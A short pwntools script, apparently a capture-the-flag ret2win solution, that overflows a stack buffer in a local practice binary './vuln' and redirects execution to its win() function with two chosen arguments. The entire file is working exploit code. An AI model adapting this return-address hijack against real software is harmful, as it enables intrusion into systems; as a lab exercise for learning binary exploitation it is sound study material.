from pwn import *

elf = context.binary = ELF('./vuln')

win_func = p32(elf.symbols['win'])

p = process('./vuln')
# Argumen untuk fungsi win()
arg1 = p32(0xcafef00d)
arg2 = p32(0xf00df00d)


#payload
payload = b"A" * 100 # buffer
payload += b"P" * 8 #padding
payload += b"E" * 4 #EBP
payload += win_func 
payload += b"P" * 4 #PADDING BEFORE STACK
payload += arg1
payload += arg2
#payload += printflagaddr

print(payload)
p.sendline(payload)

print(p.recv())

#print(p.recv())

